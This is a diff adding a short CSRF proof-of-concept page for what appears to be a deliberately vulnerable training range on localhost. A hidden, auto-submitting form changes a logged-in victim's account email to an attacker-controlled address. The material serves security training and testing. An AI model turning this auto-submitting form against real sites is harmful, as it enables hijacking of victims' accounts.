@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<!--
+  CSRF PoC — Change Email
+  Target: CSZone Backend Range, /account/email
+
+  This file is intentionally NOT part of the vulnerable app. Host it on
+  any other origin (a different port on localhost counts as cross-origin
+  for this purpose) to demonstrate the exploit the way a real attacker
+  would: get a logged-in victim to open this page while their session
+  with the target app is still active.
+
+  Requires the target to be reachable at the URL below and the victim to
+  already have an active session cookie for it in the same browser.
+-->
+<html>
+<head><title>Loading…</title></head>
+<body>
+  <form id="csrf-form" action="http://localhost:5050/account/email" method="POST">
+    <input type="hidden" name="email" value="pwned@attacker-controlled.test">
+  </form>
+  <script>
+    document.getElementById('csrf-form').submit();
+  </script>
+</body>
+</html>
